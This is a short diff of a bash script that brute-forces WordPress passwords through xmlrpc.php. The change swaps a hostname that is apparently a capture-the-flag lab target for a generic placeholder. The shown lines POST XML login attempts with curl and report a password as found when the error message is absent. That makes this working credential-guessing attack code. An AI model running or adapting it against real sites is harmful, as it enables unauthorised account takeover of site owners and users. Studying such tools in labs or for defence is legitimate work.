@@ -45,7 +45,7 @@ function makeXML () {
 EOF
 )
         echo -e "$xml" > data.xml
-        response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d @data.xml)
+        response=$(curl -s -X POST "http://domain/wordpress/xmlrpc.php" -d @data.xml)
 
         if ! echo "$response" | grep -q -E 'Incorrect username or password\.|parse error\. not well formed'; then
             echo -e "[+]Password is:${greenColour} $password ${endColour}"
